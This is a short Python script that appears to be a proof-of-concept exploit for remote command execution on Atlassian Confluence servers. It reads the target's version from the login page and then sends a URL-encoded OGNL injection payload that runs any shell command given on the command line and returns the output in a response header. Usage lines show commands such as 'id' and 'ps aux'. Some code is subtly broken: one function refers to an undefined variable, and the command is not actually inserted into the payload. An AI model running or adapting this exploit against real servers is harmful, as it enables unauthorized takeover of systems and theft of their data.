import requests
import re
import sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

def check_target_version(host):

	response = requests.get(host+"/login.action", verify=False)
	if response.status_code == 200:
		filter_version = re.findall("<span id='footer-build-information'>.*</span>",r.text)
		if(len(filter_version) >= 1):
			version = filter_version[0].split("'>")[1].split('</')[0]
			return version
		else:
			return False
	else:
		return host


def send_payload(host, command):
    
    response = requests.get("{}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22'+command+'%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/".format(host), verify=False, allow_redirects=False)
    
    if(response.status_code == 302):
        return response.headers['X-Cmd-Response']
    else:
        return False

if(len(sys.argv) < 3):
	print("How to use:")
	print("python3 {} https://target.com cmd".format(sys.argv[0]))
	print("ex: python3 {} https://target.com id".format(sys.argv[0]))
	print("ex: python3 {} https://target.com 'ps aux'".format(sys.argv[0]))

else:
	target = sys.argv[1]
	cmd = sys.argv[2]
	version = check_target_version(target)
	if version :
		print("Confluence target version: {}".format(version))
	else:
		print("Can't find the used version for this target")
	print(send_payload(target, cmd))
